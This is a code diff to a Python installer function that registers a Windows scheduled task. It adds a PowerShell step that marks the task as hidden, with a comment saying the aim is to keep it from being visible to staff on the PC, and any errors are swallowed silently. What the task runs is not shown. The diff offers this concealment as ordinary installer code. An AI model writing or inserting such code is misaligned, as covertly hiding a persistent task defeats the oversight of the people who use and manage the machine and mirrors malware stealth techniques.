@@ -95,6 +95,10 @@ def install_task(start_now: bool = True) -> tuple[bool, str]:
               "/TR", command])
     if p.returncode != 0:
         return False, (p.stderr or p.stdout).strip()
+    # Hide the task in Task Scheduler so it is not visible to staff on the PC (best effort).
+    _run(["powershell", "-NoProfile", "-Command",
+          "try{$t=Get-ScheduledTask -TaskName '" + TASK_NAME + "' -ErrorAction Stop;"
+          "$t.Settings.Hidden=$true; Set-ScheduledTask -InputObject $t | Out-Null}catch{}"])
     if start_now:
         _run(["schtasks", "/Run", "/TN", TASK_NAME])
     return True, command
